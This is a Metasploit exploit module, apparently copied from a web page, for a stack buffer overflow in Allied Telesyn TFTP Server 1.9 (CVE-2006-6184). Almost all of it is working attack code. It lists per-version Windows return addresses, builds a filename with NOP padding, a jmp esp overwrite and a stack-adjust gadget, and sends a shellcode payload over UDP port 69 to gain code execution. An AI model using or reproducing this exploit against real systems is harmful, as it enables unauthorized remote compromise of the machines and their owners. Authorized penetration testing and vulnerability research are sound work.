# $Id: attftp_long_filename.rb 11882 2011-03-05 21:00:57Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Udp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Allied Telesyn TFTP Server 1.9 Long Filename Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a
                request (get/write) for an overly long file name.
            },
            &#039;Author&#039;         => [ &#039;Patrick Webster <patrick[at]aushack.com>&#039; ],
            &#039;Version&#039;        => &#039;$Revision: 11882 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2006-6184&#039;],
                    [&#039;OSVDB&#039;, &#039;11350&#039;],
                    [&#039;BID&#039;, &#039;21320&#039;],
                    [&#039;URL&#039;,&#039;http://milw0rm.com/exploits/2887&#039;],
                    [&#039;URL&#039;, &#039;ftp://guest:guest@ftp.alliedtelesyn.co.uk/pub/utilities/at-tftpd.exe&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 210,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                # Patrick - Tested OK w2k sp0, sp4, xp sp 0, xp sp2 - en 2007/08/24
                    [ &#039;Windows NT SP4 English&#039;,   { &#039;Ret&#039; => 0x702ea6f7 } ],
                    [ &#039;Windows 2000 SP0 English&#039;, { &#039;Ret&#039; => 0x750362c3 } ],
                    [ &#039;Windows 2000 SP1 English&#039;, { &#039;Ret&#039; => 0x75031d85 } ],
                    [ &#039;Windows 2000 SP2 English&#039;, { &#039;Ret&#039; => 0x7503431b } ],
                    [ &#039;Windows 2000 SP3 English&#039;, { &#039;Ret&#039; => 0x74fe1c5a } ],
                    [ &#039;Windows 2000 SP4 English&#039;, { &#039;Ret&#039; => 0x75031dce } ],
                    [ &#039;Windows XP SP0/1 English&#039;, { &#039;Ret&#039; => 0x71ab7bfb } ],
                    [ &#039;Windows XP SP2 English&#039;,   { &#039;Ret&#039; => 0x71ab9372 } ],
                    [ &#039;Windows Server 2003&#039;,      { &#039;Ret&#039; => 0x7c86fed3 } ], # ret donated by securityxxxpert
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Nov 27 2006&#039;))
 
        register_options(
            [
                Opt::RPORT(69),
                Opt::LHOST() # Required for stack offset
            ], self.class)
    end
 
    def exploit
        connect_udp
 
        sploit = "\x00\x02" + make_nops(25 - datastore[&#039;LHOST&#039;].length)
        sploit << payload.encoded
        sploit << [target[&#039;Ret&#039;]].pack(&#039;V&#039;)   # <-- eip = jmp esp. we control it.
        sploit << "\x83\xc4\x28\xc3"      # <-- esp = add esp 0x28 + retn
        sploit << "\x00" + "netascii" + "\x00"
 
        udp_sock.put(sploit)
 
        disconnect_udp
    end
 
end



